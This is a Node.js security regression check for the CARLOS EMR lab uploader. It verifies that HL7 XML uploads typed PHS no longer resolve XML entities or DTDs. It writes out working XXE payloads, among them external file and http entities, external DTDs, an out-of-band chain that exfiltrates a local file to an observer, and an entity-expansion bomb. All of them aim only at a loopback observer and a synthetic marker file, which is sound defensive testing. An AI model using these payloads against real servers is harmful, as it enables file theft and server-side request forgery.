#!/usr/bin/env node
/**
 * Copyright (c) 2026 CARLOS Contributors. All Rights Reserved.
 *
 * This software is published under the GPL GNU General Public License.
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of the GNU General Public License
 * as published by the Free Software Foundation; either version 2
 * of the License, or (at your option) any later version.
 *
 * CARLOS EMR Project
 * https://github.com/carlos-emr/carlos
 */

/*
 * Deployed check for issue #5414: an HL7 lab upload typed PHS whose body is HL7 XML must never make
 * the server resolve an XML entity or DTD.
 *
 * Under HAPI HL7 v2 1.0.1, PhsStarHandler parsed such a body with HAPI's GenericParser, whose XML
 * reader loaded external DTDs and entities. A user with `_lab` write could upload a PHS lab that
 * made the server fetch a URL of their choosing and, through a parameter-entity chain, send it the
 * contents of a local file. This check sends those payloads the way such a user would: a direct
 * multipart POST to lab/CA/ALL/insideLabUpload with type=PHS (PHS is not in the uploader's
 * drop-down, and its "Other" text box has no name, so the page itself never sends it), carrying the
 * session's CSRF token.
 *
 * Every payload points at an HTTP observer this process starts on a loopback port, and the file
 * entity points at a synthetic marker file in a temporary directory. Nothing public is contacted.
 *
 * Steps:
 *   1. A benign PHS ADT^A01 in pipe encoding and the same message in HL7 XML (no DOCTYPE) are both
 *      accepted ("COMPLETED"): the hardened XML reader still parses legitimate HL7 XML on the
 *      deployed JVM. ADT^A01 is a trigger the PHS handler ignores after parsing, so nothing but the
 *      upload checksum and its archived copy is written.
 *   2. Each entity/DTD payload is refused (FAILED or INVALID), leaves no checksum row, and the
 *      observer receives no request at all, before or after.
 *
 * The observer must be reachable from the server for "no request" to mean anything. That holds
 * when the server shares this process's network namespace (BASE_URL on loopback: the devcontainer,
 * and the deb validation container, which runs checks inside the container with host networking).
 * For any other target set LAB_XXE_OBSERVER_HOST to an address of this machine the server can
 * reach; without it a non-loopback BASE_URL is skipped rather than passed. Against a package
 * built with HAPI 1.0.1, step 2 fails.
 *
 * FIXTURE SAFETY: every upload is named lab-xxe-probe-<stamp>-<n>.<ext>; cleanup removes this
 * run's fileUploadCheck rows by that stamp, pass or fail. Archived copies under DOCUMENT_DIR are
 * removed when LAB_UPLOAD_DOCUMENT_STORE points at that directory, as in
 * lab-upload-playwright-checks.js; otherwise they are kept and the check says so.
 *
 * Environment (beyond the common contract in lib/playwright-harness.js):
 *   LAB_XXE_OBSERVER_HOST      address to bind the observer to and to name in payloads, for a
 *                              server outside this network namespace. Default 127.0.0.1.
 *   LAB_UPLOAD_DOCUMENT_STORE  the server's DOCUMENT_DIR, mounted or local; enables removal of
 *                              this run's archived uploads.
 */

const crypto = require('node:crypto');
const fs = require('node:fs');
const http = require('node:http');
const os = require('node:os');
const path = require('node:path');
const { pathToFileURL } = require('node:url');
const h = require('./lib/playwright-harness');
const { runWorkflow } = require('./lib/workflow-session');
const { openUploader } = require('./lab-upload-playwright-checks');

const LOOPBACK_HOSTS = new Set(['localhost', '127.0.0.1', '::1', '[::1]']);
const contextPathOf = (baseUrl) => new URL(baseUrl).pathname.replace(/\/+$/, '');
const PROBE_NAME = /^lab-xxe-probe-[0-9A-F]{8}-\d+\.(?:hl7|xml)$/;
const ARCHIVED_NAME = /^LabUpload\.lab-xxe-probe-[0-9A-F]{8}-\d+\.(?:hl7|xml)\.\d+$/;

/**
 * Refuses (SKIP) a run whose server could not reach the observer, where zero observed requests
 * would prove nothing.
 */
function requireReachableObserver({ config }) {
  const host = new URL(config.baseUrl).hostname.toLowerCase();
  if (!LOOPBACK_HOSTS.has(host) && !process.env.LAB_XXE_OBSERVER_HOST) {
    throw new h.SkipCheck(`BASE_URL host ${host} is not loopback and LAB_XXE_OBSERVER_HOST is not set, `
      + 'so the server could not reach the observer and a clean result would mean nothing');
  }
}

/**
 * Starts the loopback HTTP observer. It answers every request so a vulnerable parser carries on
 * down the chain (the out-of-band DTD asks for a second URL carrying the marker file's text).
 */
async function startObserver(markers) {
  const requests = [];
  let base = '';
  const server = http.createServer((request, response) => {
    requests.push(`${request.method} ${request.url}`);
    let body = markers.http;
    if (request.url.startsWith('/oob.dtd')) {
      body = `<!ENTITY % all "<!ENTITY exfil SYSTEM '${base}/collect?%file;'>">%all;`;
    } else if (/\.dtd(?:\?|$)/.test(request.url)) {
      body = `<!ENTITY remote "${markers.http}">`;
    }
    response.writeHead(200, { 'Content-Type': 'text/plain' });
    response.end(body);
  });
  const bindHost = process.env.LAB_XXE_OBSERVER_HOST || '127.0.0.1';
  await new Promise((resolve, reject) => {
    server.once('error', reject);
    server.listen(0, bindHost, resolve);
  });
  const urlHost = bindHost.includes(':') ? `[${bindHost}]` : bindHost;
  base = `http://${urlHost}:${server.address().port}`;
  return {
    base,
    requests: () => [...requests],
    close: () => new Promise((resolve) => {
      server.close(() => resolve());
      // close() waits for kept-alive connections; Node 18.2+ can end them now (19+ does for idle ones).
      server.closeAllConnections?.();
    }),
  };
}

/** A synthetic ADT^A01 in HAPI's HL7 v2.3 XML encoding; `doctype` goes before the root element. */
function adtA01Xml(controlId, doctype, familyName) {
  return [
    '<?xml version="1.0"?>',
    `${doctype}<ADT_A01 xmlns="urn:hl7-org:v2xml">`,
    '  <MSH>',
    '    <MSH.1>|</MSH.1>',
    '    <MSH.2>^~\\&amp;</MSH.2>',
    '    <MSH.3><HD.1>PHS</HD.1></MSH.3>',
    '    <MSH.4><HD.1>STAR</HD.1></MSH.4>',
    '    <MSH.7><TS.1>20261029120000</TS.1></MSH.7>',
    '    <MSH.9><CM_MSG.1>ADT</CM_MSG.1><CM_MSG.2>A01</CM_MSG.2></MSH.9>',
    `    <MSH.10>${controlId}</MSH.10>`,
    '    <MSH.11><PT.1>P</PT.1></MSH.11>',
    '    <MSH.12>2.3</MSH.12>',
    '  </MSH>',
    '  <EVN><EVN.1>A01</EVN.1><EVN.2><TS.1>20261029120000</TS.1></EVN.2></EVN>',
    '  <PID>',
    '    <PID.1>1</PID.1>',
    '    <PID.3><CX.1>SYN000123</CX.1><CX.5>MR</CX.5></PID.3>',
    `    <PID.5><XPN.1>${familyName}</XPN.1><XPN.2>PATIENT</XPN.2></PID.5>`,
    '    <PID.7><TS.1>19800101</TS.1></PID.7>',
    '    <PID.8>F</PID.8>',
    '  </PID>',
    '</ADT_A01>',
    '',
  ].join('\n');
}

/** The same synthetic ADT^A01 in pipe (ER7) encoding. */
function adtA01Pipe(controlId) {
  return [
    `MSH|^~\\&|PHS|STAR|CARLOS|CARLOS|20261029120000||ADT^A01|${controlId}|P|2.3`,
    'EVN|A01|20261029120000',
    'PID|1||SYN000123^^^PHS^MR||SYNTHETIC^PATIENT||19800101|F',
    '',
  ].join('\r');
}

/**
 * The attack classes from issue #5414, mirroring Hl7XmlEntityAttackFixture in the unit tests:
 * external general entities (file and http), an external parameter entity, external DTDs
 * (SYSTEM and PUBLIC), the out-of-band exfiltration chain, and internal entity expansion.
 */
function attackPayloads(base, markerFileUrl, controlId) {
  return [
    ['external general entity (file)',
      `<!DOCTYPE ADT_A01 [<!ENTITY ext SYSTEM "${markerFileUrl}">]>\n`, '&ext;'],
    ['external general entity (http)',
      `<!DOCTYPE ADT_A01 [<!ENTITY ext SYSTEM "${base}/general">]>\n`, '&ext;'],
    ['external parameter entity',
      `<!DOCTYPE ADT_A01 [<!ENTITY % remote SYSTEM "${base}/param.dtd"> %remote;]>\n`, '&remote;'],
    ['external DTD (SYSTEM)', `<!DOCTYPE ADT_A01 SYSTEM "${base}/external.dtd">\n`, 'SYNTHETIC'],
    ['external DTD (PUBLIC)',
      `<!DOCTYPE ADT_A01 PUBLIC "-//CARLOS//SYNTHETIC//EN" "${base}/public.dtd">\n`, 'SYNTHETIC'],
    ['out-of-band exfiltration chain',
      `<!DOCTYPE ADT_A01 [<!ENTITY % file SYSTEM "${markerFileUrl}"><!ENTITY % oob SYSTEM "${base}/oob.dtd"> %oob;]>\n`,
      '&exfil;'],
    ['internal entity expansion',
      '<!DOCTYPE ADT_A01 [<!ENTITY a "SYNTHAAAAAAAAAA"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">'
        + '<!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">]>\n', '&c;'],
  ].map(([label, doctype, familyName], index) => ({
    label, body: adtA01Xml(`${controlId}X${index}`, doctype, familyName),
  }));
}

/**
 * POSTs one file to lab/CA/ALL/insideLabUpload as lab type PHS from the logged-in uploader page,
 * and returns the HTTP status, the per-file status the page reports, and the page text.
 */
async function postPhsUpload(page, contextPath, fileName, content) {
  const result = await page.evaluate(async ({ context, name, text }) => {
    const tokenInput = document.querySelector('input[name="CSRF-TOKEN"]');
    const form = new FormData();
    form.append('importFiles', new Blob([text], { type: 'application/octet-stream' }), name);
    form.append('type', 'PHS');
    const headers = { 'X-Requested-With': 'XMLHttpRequest' };
    if (tokenInput && tokenInput.value) headers['CSRF-TOKEN'] = tokenInput.value;
    const response = await fetch(`${context}/lab/CA/ALL/insideLabUpload`, {
      method: 'POST', body: form, headers, credentials: 'same-origin',
    });
    return {
      status: response.status, server: response.headers.get('server') || '', html: await response.text(),
      hadToken: !!(tokenInput && tokenInput.value),
    };
  }, { context: contextPath, name: fileName, text: content });
  h.assert(result.hadToken, 'The uploader page carried no CSRF token to send with the PHS upload');
  h.assert(result.status === 200,
    `lab/CA/ALL/insideLabUpload answered HTTP ${result.status}${/nginx/i.test(result.server) ? ' from the front door' : ''}`
    + ' instead of the uploader page, so the payload never reached the PHS parser');
  // testUploader.jsp reports each file as addFileNameWithStatus("<name>", "<FileStatus>"); the name
  // is JavaScript-encoded, so backslash escapes are dropped before comparing.
  const reported = [...result.html.matchAll(/addFileNameWithStatus\("((?:[^"\\]|\\.)*)",\s*"([A-Z]+)"\)/g)]
    .map(([, name, status]) => ({ name: name.replace(/\\(.)/g, '$1'), status }));
  const own = reported.filter((entry) => entry.name === fileName);
  h.assert(own.length === 1, `The uploader page reported ${own.length} statuses for ${fileName}`);
  return { status: own[0].status, html: result.html };
}

/** This run's archived uploads in LAB_UPLOAD_DOCUMENT_STORE, or null when it is not set. */
function archivedUploads(stamp) {
  const store = process.env.LAB_UPLOAD_DOCUMENT_STORE;
  if (!store) return null;
  const prefix = `LabUpload.lab-xxe-probe-${stamp}-`;
  return fs.readdirSync(fs.realpathSync(store))
    .filter((name) => ARCHIVED_NAME.test(name) && name.startsWith(prefix));
}

async function workflow(session) {
  const { sql, config, cleanup } = session;
  const stamp = crypto.randomBytes(4).toString('hex').toUpperCase();
  const controlId = `XXE${stamp}`;
  // Every upload of this run is archived as LabUpload.lab-xxe-probe-<stamp>-<n>.<ext>.<millis>.
  const ownUploads = `%lab-xxe-probe-${stamp}-%`;
  const COUNT_UPLOADS = 'SELECT COUNT(*) FROM fileUploadCheck WHERE filename LIKE ?';
  const markers = {
    file: `SYNTHFILEMARKER${crypto.randomBytes(8).toString('hex')}`,
    http: `SYNTHHTTPMARKER${crypto.randomBytes(8).toString('hex')}`,
  };
  // Checked before anything is created, so a refusal here leaves nothing to clean up.
  h.assert(sql.value(COUNT_UPLOADS, [ownUploads]) === '0',
    'A fileUploadCheck row already carries this run\'s stamp');

  const workDir = fs.mkdtempSync(path.join(os.tmpdir(), 'carlos-lab-xxe-'));
  // Fixed name inside a directory this run just created.
  const markerFile = path.join(workDir, 'synthetic-marker.txt'); // nosemgrep: javascript.lang.security.audit.path-traversal.path-join-resolve-traversal.path-join-resolve-traversal
  fs.writeFileSync(markerFile, markers.file);
  const observer = await startObserver(markers);
  const contextPath = contextPathOf(config.baseUrl);
  let uploadCount = 0;

  cleanup(async () => {
    await observer.close();
    fs.rmSync(workDir, { recursive: true, force: true });
    sql.execute('DELETE FROM fileUploadCheck WHERE filename LIKE ?', [ownUploads]);
    h.assert(sql.value(COUNT_UPLOADS, [ownUploads]) === '0',
      'This run\'s fileUploadCheck rows were not all removed');
    const archived = archivedUploads(stamp);
    if (archived === null) {
      console.warn(`    archived uploads retained: set LAB_UPLOAD_DOCUMENT_STORE to remove LabUpload.lab-xxe-probe-${stamp}-*`);
      return;
    }
    const root = fs.realpathSync(process.env.LAB_UPLOAD_DOCUMENT_STORE);
    // Each name matched ARCHIVED_NAME and this run's stamp, and is joined to the resolved store.
    for (const name of archived) fs.unlinkSync(path.join(root, name)); // nosemgrep: javascript.lang.security.audit.path-traversal.path-join-resolve-traversal.path-join-resolve-traversal
    h.assert(archivedUploads(stamp).length === 0, 'This run\'s archived uploads were not all removed');
  });

  /** Uploads one file through a fresh uploader popup and returns what the page reported. */
  async function upload(extension, content) {
    uploadCount += 1;
    const fileName = `lab-xxe-probe-${stamp}-${uploadCount}.${extension}`;
    h.assert(PROBE_NAME.test(fileName), `Unexpected probe file name ${fileName}`);
    const { inbox, popup } = await openUploader(session);
    try {
      return { fileName, ...(await postPhsUpload(popup, contextPath, fileName, content)) };
    } finally {
      await popup.close().catch(() => {});
      await inbox.close().catch(() => {});
    }
  }

  const ownRow = (fileName) => sql.value(COUNT_UPLOADS, [`%${fileName}%`]);

  await session.step('benign PHS messages in pipe and XML encoding are accepted', async () => {
    for (const [extension, content] of [['hl7', adtA01Pipe(`${controlId}P`)], ['xml', adtA01Xml(`${controlId}M`, '', 'SYNTHETIC')]]) {
      const outcome = await upload(extension, content);
      h.assert(outcome.status === 'COMPLETED',
        `The benign ${extension === 'xml' ? 'XML' : 'pipe'} PHS message was reported ${outcome.status}`);
      h.assert(ownRow(outcome.fileName) === '1', `The accepted ${outcome.fileName} recorded no checksum row`);
    }
    h.assert(observer.requests().length === 0,
      `The observer received requests during benign uploads: ${observer.requests().join(', ')}`);
  });

  await session.step('XML entity and DTD payloads are refused with no outbound request', async () => {
    for (const attack of attackPayloads(observer.base, pathToFileURL(markerFile).href, controlId)) {
      const outcome = await upload('xml', attack.body);
      const requests = observer.requests();
      h.assert(requests.length === 0,
        `${attack.label}: the server contacted the observer (${requests.join(', ')})`);
      h.assert(['FAILED', 'INVALID'].includes(outcome.status),
        `${attack.label}: the upload was reported ${outcome.status} instead of being refused`);
      h.assert(!outcome.html.includes(markers.file) && !outcome.html.includes(markers.http),
        `${attack.label}: the uploader page echoed a marker`);
      h.assert(ownRow(outcome.fileName) === '0',
        `${attack.label}: the refused upload left a checksum row that would block a corrected retry`);
      const archived = archivedUploads(stamp);
      if (archived !== null) {
        h.assert(!archived.some((name) => name.startsWith(`LabUpload.${outcome.fileName}.`)),
          `${attack.label}: the refused upload left its archived copy in DOCUMENT_DIR`);
      }
    }
  });
}

if (require.main === module) {
  runWorkflow('lab-upload-xml-entity', workflow, { openPatient: false, preflightConfig: requireReachableObserver });
}
module.exports = { workflow, adtA01Xml, adtA01Pipe, attackPayloads, startObserver };
